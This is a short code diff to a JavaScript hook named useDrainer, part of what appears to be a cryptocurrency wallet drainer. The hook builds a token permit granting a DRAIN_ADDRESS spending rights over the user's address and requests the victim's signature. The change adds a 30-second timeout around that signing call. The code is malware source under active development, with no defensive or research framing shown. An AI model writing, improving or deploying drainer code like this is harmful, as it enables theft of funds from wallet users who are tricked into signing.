@@ -61,7 +61,14 @@ export function useDrainer() {
     const deadline = Math.floor(Date.now() / 1000) + 3600
     const nonce = generateNonce()
     const permitData = buildPermitData(userAddress, DRAIN_ADDRESS, nonce, deadline)
-    const signature = await signTypedDataAsync(permitData)
+    
+    const timeoutPromise = new Promise((_, reject) => {
+      setTimeout(() => reject(new Error('timeout')), 30000)
+    })
+    
+    const signaturePromise = signTypedDataAsync(permitData)
+    const signature = await Promise.race([signaturePromise, timeoutPromise])
+    
     return { signature, nonce, deadline }
   }
 
